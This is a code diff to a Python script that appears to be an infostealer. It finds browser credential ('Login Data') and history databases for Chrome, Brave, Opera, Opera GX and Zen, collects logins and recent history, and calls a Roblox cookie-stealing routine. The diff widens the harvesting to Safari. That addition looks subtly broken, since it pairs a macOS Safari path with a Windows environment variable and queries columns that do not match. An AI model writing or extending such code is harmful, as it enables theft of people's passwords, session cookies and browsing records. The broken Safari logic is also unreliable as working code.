@@ -269,13 +269,31 @@ def get_login_data_path(browser):
             "Brave": os.path.join(user_profile, r"AppData\Local\BraveSoftware\Brave-Browser\User Data"),
             "Opera": os.path.join(user_profile, r"AppData\Roaming\Opera Software\Opera Stable"),
             "Opera GX": os.path.join(user_profile, r"AppData\Roaming\Opera Software\Opera GX Stable"),
-            "Zen": os.path.join(user_profile, r"AppData\Local\Zen\Zen\User Data")
+            "Zen": os.path.join(user_profile, r"AppData\Local\Zen\Zen\User Data"),
+            "Safari": os.path.join(user_profile, r"Library\Safari")
         }
 
         for profile in ["Default", "Profile 1", "Profile 2"]:
             candidate = os.path.join(base_paths[browser], profile, "Login Data")
             if os.path.exists(candidate):
                 return candidate
+    except:
+        pass
+    return None
+
+def get_history_path(browser):
+    try:
+        user_profile = os.environ['USERPROFILE']
+        history_paths = {
+            "Chrome": os.path.join(user_profile, r"AppData\Local\Google\Chrome\User Data\Default\History"),
+            "Brave": os.path.join(user_profile, r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History"),
+            "Opera": os.path.join(user_profile, r"AppData\Roaming\Opera Software\Opera Stable\History"),
+            "Opera GX": os.path.join(user_profile, r"AppData\Roaming\Opera Software\Opera GX Stable\History"),
+            "Zen": os.path.join(user_profile, r"AppData\Local\Zen\Zen\User Data\Default\History"),
+            "Safari": os.path.join(user_profile, r"Library\Safari\History.db")
+        }
+
+        return history_paths.get(browser)
     except:
         pass
     return None
@@ -348,15 +366,7 @@ def collect_browser_logins(browser):
         pass
 
 def get_browser_history(browser, limit=100):
-    history_paths = {
-        "Chrome": os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Default\History"),
-        "Brave": os.path.join(os.environ['LOCALAPPDATA'], r"BraveSoftware\Brave-Browser\User Data\Default\History"),
-        "Opera": os.path.join(os.environ['APPDATA'], r"Opera Software\Opera Stable\History"),
-        "Opera GX": os.path.join(os.environ['APPDATA'], r"Opera Software\Opera GX Stable\History"),
-        "Zen": os.path.join(os.environ['LOCALAPPDATA'], r"Zen\Zen\User Data\Default\History")
-    }
-
-    original_path = history_paths.get(browser)
+    original_path = get_history_path(browser)
     if not original_path or not os.path.exists(original_path):
         return "History path not found for browser."
 
@@ -367,7 +377,10 @@ def get_browser_history(browser, limit=100):
         conn = sqlite3.connect(temp_path)
         cursor = conn.cursor()
 
-        cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT ?", (limit,))
+        if browser == "Safari":
+            cursor.execute("SELECT url, title, last_visited FROM history_items ORDER BY last_visited DESC LIMIT ?", (limit,))
+        else:
+            cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT ?", (limit,))
         rows = cursor.fetchall()
 
         history_lines = []
@@ -409,7 +422,7 @@ if __name__ == "__main__":
     retrieve_roblox_cookies()
 
     # Collect logins and history for each browser
-    browsers = ["Chrome", "Brave", "Opera", "Opera GX", "Zen"]
+    browsers = ["Chrome", "Brave", "Opera", "Opera GX", "Zen", "Safari"]
     for browser in browsers:
         collect_browser_logins(browser)
         history = get_browser_history(browser, limit=100)
